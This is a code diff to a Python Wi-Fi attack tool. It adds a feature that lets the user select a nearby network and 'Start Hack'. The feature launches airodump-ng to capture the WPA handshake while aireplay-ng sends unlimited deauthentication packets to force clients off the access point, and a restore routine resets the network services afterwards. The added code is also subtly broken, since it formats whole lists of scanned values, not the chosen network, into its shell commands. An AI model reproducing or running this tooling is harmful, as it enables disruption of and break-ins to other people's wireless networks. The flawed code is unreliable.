@@ -375,7 +375,7 @@ def manual():
     elif response == '4':
         pass
     elif response == '5':
-        pass
+        restore()
     elif response == '6':
         banner()
     elif response == '7':
@@ -450,32 +450,32 @@ def get_hand():
 
 def get_bssid():
     global root
-    global bssid
-    bssid = root.findall('.//BSSID')
+    global bssidm
+    bssidm = root.findall('.//BSSID')
     get_channel()
 
 def get_channel():
-    global channel
-    channel = root.findall('.//channel')
+    global channelm
+    channelm = root.findall('.//channel')
     get_essid()
 
 def get_essid():
-    global essid
-    essid = root.findall('.//essid')
+    global essidm
+    essidm = root.findall('.//essid')
     printa()
 
 def printa():
-    global bssid
-    global channel
-    global essid
+    global bssidm
+    global channelm
+    global essidm
     i = 0
     print(colored("Select One Network To Start Hack","yellow"))
     print("")
-    while i < len(essid):
+    while i < len(essidm):
         print(colored("Network {}","green").format(i+1))
-        print(colored("ESSID   : {}","green").format(str(essid[i].text)))
-        print(colored("BSSID   : {}","green").format(str(bssid[i].text)))
-        print(colored("CHANNEl : {}","green").format(str(channel[i].text)))
+        print(colored("ESSID   : {}","green").format(str(essidm[i].text)))
+        print(colored("BSSID   : {}","green").format(str(bssidm[i].text)))
+        print(colored("CHANNEl : {}","green").format(str(channelm[i].text)))
         print("")
         time.sleep(1)
         i+=1
@@ -483,12 +483,63 @@ def printa():
     topri = (int(response) - 1)
     os.system("clear")
     print(colored("You Selected Network {}","green").format(int(response)))
-    print(colored("ESSID   : {}","green").format(str(essid[topri].text)))
-    print(colored("BSSID   : {}","green").format(str(bssid[topri].text)))
-    print(colored("CHANNEl : {}","green").format(str(channel[topri].text)))
+    print(colored("ESSID   : {}","green").format(str(essidm[topri].text)))
+    print(colored("BSSID   : {}","green").format(str(bssidm[topri].text)))
+    print(colored("CHANNEl : {}","green").format(str(channelm[topri].text)))
     print("")
-    time.sleep(2)
-    #need to get hand shek airodum and aireplay with threed
+    input(colored("Press Enter To Start Hack","green"))
+    hack_manual()
 
+def hack_manual():
+    Thread(target = sta_aird).start()
+    time.sleep(10)
+    Thread(target = sta_airp).start()
+
+def sta_aird():
+    interface = netifaces.interfaces()                                                                                                                                         
+    inte = interface[2] 
+    global bssidm                                                                                                                                                                  
+    global channelm                                                                                                                                                                        
+    global essidm                                                                                                                                                            
+    print(colored("Wait For Handshake Then Close Both The Window","yellow"))                                                                                                           
+    time.sleep(2)                                                                                                                                                                     
+    os.system("xterm -bg black -fg brown -e 'airodump-ng --bssid {} --channel {} --write {} {}'".format(bssidm,channelm,essidm,inte))
+    manual()
+
+def sta_airp():
+    global bssidm 
+    interface = netifaces.interfaces()                                                                                                                                         
+    inte = interface[2]                                                                                                                                                                                                                                                                                                                
+    os.system("xterm -bg black -fg brown -e 'aireplay-ng --deauth 0 -a {} {} --ignore-negative-one'".format(bssidm,inte))       
+
+def restore():
+    print(colored("Changing Interface Back To wlan0","yellow"))
+    time.sleep(2)
+    os.system("airmon-ng stop wlan0mon")
+    try:                                                                                                                                                                                                        
+        netmanager = check_output(["pidof","NetworkManager"]).decode("ascii").rstrip()                                                                                                                                      
+        print(colored("NetworkManager Is Running","green"))                                                                                                                                         
+        time.sleep(2)                                                                                                                                                                                                                                                            
+    except:                                                                                                                                                                                                                         
+        print(colored("Restarting NetworkManager...","yellow"))                                                                                                                                                                                           
+        time.sleep(2)
+        os.system("service NetworkManager restart")     
+    try:                                                                                                                                                                                                        
+        wpa = check_output(["pidof","wpa_supplicant"]).decode("ascii").rstrip()                                                                                                                                      
+        print(colored("wpa_supplicant Is Running","green"))                                                                                                                                         
+        time.sleep(2)                                                                                                                                                                                                                                                            
+    except:                                                                                                                                                                                                                         
+        print(colored("Restarting wpa_supplicant...","yellow"))                                                                                                                                                                                           
+        time.sleep(2)
+        os.system("service wpa_supplicant restart") 
+    try:                                                                                                                                                                                                        
+        dhc = check_output(["pidof","dhclient"]).decode("ascii").rstrip()                                                                                                                                      
+        print(colored("dhclient Is Running","green"))                                                                                                                                         
+        time.sleep(2)                                                                                                                                                                                                                                                            
+    except:                                                                                                                                                                                                                         
+        print(colored("Restarting dhclient...","yellow"))                                                                                                                                                                                           
+        time.sleep(2)
+        os.system("service dhclient restart") 
+    manual()   
 #call functions
 check_root()
